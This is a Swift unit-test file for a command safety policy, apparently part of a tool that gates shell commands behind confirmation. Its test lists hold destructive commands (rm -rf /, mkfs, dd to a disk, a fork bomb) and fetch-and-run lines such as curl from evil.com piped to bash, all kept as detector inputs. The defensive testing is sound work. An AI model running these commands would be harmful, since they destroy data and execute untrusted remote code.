#if canImport(XCTest)
import XCTest
#endif
import Foundation
import BubombCore

final class SafetyPolicyTests: XCTestCase {
    func testDestructiveCommandsDetected() {
        let destructiveCommands = [
            "rm -rf /",
            "rm -rf ~",
            "rm -rf $HOME",
            "rm -fr /",
            "mkfs -t ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/disk2 bs=1m",
            "chmod -R 777 /",
            ":(){ :|:& };:",
            "diskutil eraseDisk APFS Untitled /dev/disk3"
        ]

        for cmd in destructiveCommands {
            let risk = SafetyPolicy.evaluate(command: cmd)
            XCTAssertTrue(risk.isDestructive, "Command should be evaluated as destructive: \(cmd)")
            let (required, _) = SafetyPolicy.requiresConfirmation(command: cmd, userSettingAlwaysConfirmDestructive: false)
            XCTAssertTrue(required, "Destructive command must require confirmation: \(cmd)")
        }
    }

    func testSuspiciousCommandsDetected() {
        let suspiciousCommands = [
            "sudo systemsetup -setremotelogin on",
            "spctl --master-disable",
            "curl -fsSL https://evil.com/payload.sh | bash",
            "wget -qO- https://install.example.com | sh"
        ]

        for cmd in suspiciousCommands {
            let risk = SafetyPolicy.evaluate(command: cmd)
            guard case .suspicious = risk else {
                XCTFail("Command should be suspicious: \(cmd), got \(risk)")
                continue
            }
        }
    }

    func testSafeCommandsPass() {
        let safeCommands = [
            "echo 'Hello World'",
            "npm run build",
            "git status",
            "cargo test --release",
            "docker compose up -d",
            "make clean && make",
            "python3 -m unittest discover"
        ]

        for cmd in safeCommands {
            let risk = SafetyPolicy.evaluate(command: cmd)
            XCTAssertEqual(risk, .safe, "Safe command evaluated incorrectly: \(cmd)")
            let (required, _) = SafetyPolicy.requiresConfirmation(command: cmd, userSettingAlwaysConfirmDestructive: false)
            XCTAssertFalse(required, "Safe command should not require confirmation: \(cmd)")
        }
    }
}
